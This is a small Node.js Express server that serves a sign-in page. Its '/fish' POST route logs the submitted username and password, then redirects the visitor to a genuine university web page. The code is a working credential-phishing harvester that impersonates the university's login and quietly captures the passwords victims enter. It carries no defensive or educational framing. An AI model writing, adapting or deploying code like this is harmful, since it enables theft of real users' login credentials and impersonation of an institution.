var express = require('express');
var path = require('path');
var favicon = require('serve-favicon');
var logger = require('morgan');
var cookieParser = require('cookie-parser');
var bodyParser = require('body-parser');

var index = require('./routes/index');
var users = require('./routes/users');

var app = express();
var port = 1877;
app.use(express.static(path.join(__dirname)));

// uncomment after placing your favicon in /public
//app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')));
app.use(logger('dev'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.listen(port,()=>{
	console.log("listening on port : " + port);
})

app.get('/',(req,res)=>{
	res.sendFile(path.join(__dirname+'/Sign In.html'));
});

app.post('/fish', function(req, res) {
    console.log(req.query.id);
    console.log(req.body);
    console.log(req.body.UserName);
    console.log(req.body.Password);
    //res.send("Log in success");
    res.location('http://oia.ncku.edu.tw/bin/home.php');
    res.send(302);
});
